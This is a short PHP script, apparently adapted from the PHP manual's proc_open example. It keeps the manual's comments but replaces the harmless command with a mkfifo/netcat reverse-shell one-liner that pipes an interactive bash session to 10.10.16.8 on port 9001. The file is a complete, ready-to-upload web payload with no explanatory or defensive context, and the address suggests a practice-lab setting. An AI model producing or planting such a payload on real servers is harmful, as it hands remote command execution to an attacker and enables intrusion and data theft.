```
<?php
$descriptorspec = array(
0 => array("pipe", "r"), // stdin is a pipe that the child will read from
1 => array("pipe", "w"), // stdout is a pipe that the child will write to
2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
);
$cwd = '/tmp';
$env = array('some\_option' => 'aeiou');
$process = proc\_open('sh', $descriptorspec, $pipes, $cwd, $env);
if (is\_resource($process)) {
// $pipes now looks like this:
// 0 => writeable handle connected to child stdin
// 1 => readable handle connected to child stdout
// Any error output will be appended to /tmp/error-output.txt
fwrite($pipes[0], 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.8 9001 >/tmp/f');
fclose($pipes[0]);
echo stream\_get\_contents($pipes[1]);
fclose($pipes[1]);
// It is important that you close any pipes before calling
// proc\_close in order to avoid a deadlock
$return\_value = proc\_close($process);
echo "command returned $return\_value\n";
}
?>
```
